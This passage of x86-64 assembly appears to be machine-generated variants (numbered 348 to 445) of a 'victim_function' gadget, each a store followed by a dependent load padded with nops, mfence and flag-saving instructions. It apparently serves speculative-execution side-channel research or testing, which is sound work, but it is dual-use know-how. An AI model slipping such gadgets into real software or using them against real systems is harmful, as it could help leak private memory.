	jmp	.Lvictim_function_win0_continue
## Variant 348
.Lvictim_function_win0_var348:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 349
.Lvictim_function_win0_var349:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 350
.Lvictim_function_win0_var350:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 351
.Lvictim_function_win0_var351:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 352
.Lvictim_function_win0_var352:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 353
.Lvictim_function_win0_var353:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 354
.Lvictim_function_win0_var354:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 355
.Lvictim_function_win0_var355:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 356
.Lvictim_function_win0_var356:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 357
.Lvictim_function_win0_var357:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 358
.Lvictim_function_win0_var358:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 359
.Lvictim_function_win0_var359:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 360
.Lvictim_function_win0_var360:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 361
.Lvictim_function_win0_var361:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 362
.Lvictim_function_win0_var362:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 363
.Lvictim_function_win0_var363:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 364
.Lvictim_function_win0_var364:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 365
.Lvictim_function_win0_var365:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 366
.Lvictim_function_win0_var366:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 367
.Lvictim_function_win0_var367:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 368
.Lvictim_function_win0_var368:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 369
.Lvictim_function_win0_var369:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 370
.Lvictim_function_win0_var370:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 371
.Lvictim_function_win0_var371:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 372
.Lvictim_function_win0_var372:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 373
.Lvictim_function_win0_var373:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 374
.Lvictim_function_win0_var374:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 375
.Lvictim_function_win0_var375:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 376
.Lvictim_function_win0_var376:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 377
.Lvictim_function_win0_var377:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 378
.Lvictim_function_win0_var378:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 379
.Lvictim_function_win0_var379:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 380
.Lvictim_function_win0_var380:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 381
.Lvictim_function_win0_var381:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 382
.Lvictim_function_win0_var382:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 383
.Lvictim_function_win0_var383:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 384
.Lvictim_function_win0_var384:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 385
.Lvictim_function_win0_var385:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 386
.Lvictim_function_win0_var386:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 387
.Lvictim_function_win0_var387:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 388
.Lvictim_function_win0_var388:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 389
.Lvictim_function_win0_var389:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 390
.Lvictim_function_win0_var390:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 391
.Lvictim_function_win0_var391:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 392
.Lvictim_function_win0_var392:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 393
.Lvictim_function_win0_var393:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 394
.Lvictim_function_win0_var394:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 395
.Lvictim_function_win0_var395:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 396
.Lvictim_function_win0_var396:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 397
.Lvictim_function_win0_var397:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 398
.Lvictim_function_win0_var398:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 399
.Lvictim_function_win0_var399:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 400
.Lvictim_function_win0_var400:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 401
.Lvictim_function_win0_var401:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 402
.Lvictim_function_win0_var402:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 403
.Lvictim_function_win0_var403:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 404
.Lvictim_function_win0_var404:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 405
.Lvictim_function_win0_var405:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 406
.Lvictim_function_win0_var406:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 407
.Lvictim_function_win0_var407:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 408
.Lvictim_function_win0_var408:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 409
.Lvictim_function_win0_var409:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 410
.Lvictim_function_win0_var410:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 411
.Lvictim_function_win0_var411:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 412
.Lvictim_function_win0_var412:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 413
.Lvictim_function_win0_var413:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 414
.Lvictim_function_win0_var414:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 415
.Lvictim_function_win0_var415:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 416
.Lvictim_function_win0_var416:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 417
.Lvictim_function_win0_var417:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 418
.Lvictim_function_win0_var418:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 419
.Lvictim_function_win0_var419:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 420
.Lvictim_function_win0_var420:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 421
.Lvictim_function_win0_var421:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 422
.Lvictim_function_win0_var422:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 423
.Lvictim_function_win0_var423:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 424
.Lvictim_function_win0_var424:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 425
.Lvictim_function_win0_var425:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 426
.Lvictim_function_win0_var426:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 427
.Lvictim_function_win0_var427:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 428
.Lvictim_function_win0_var428:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 429
.Lvictim_function_win0_var429:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 430
.Lvictim_function_win0_var430:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 431
.Lvictim_function_win0_var431:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 432
.Lvictim_function_win0_var432:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 433
.Lvictim_function_win0_var433:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 434
.Lvictim_function_win0_var434:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 435
.Lvictim_function_win0_var435:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 436
.Lvictim_function_win0_var436:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 437
.Lvictim_function_win0_var437:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 438
.Lvictim_function_win0_var438:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 439
.Lvictim_function_win0_var439:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 440
.Lvictim_function_win0_var440:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 441
.Lvictim_function_win0_var441:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 442
.Lvictim_function_win0_var442:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 443
.Lvictim_function_win0_var443:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 444
.Lvictim_function_win0_var444:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 445
.Lvictim_function_win0_var445:
	popq	%rax
	movq	%rcx, (%rax)
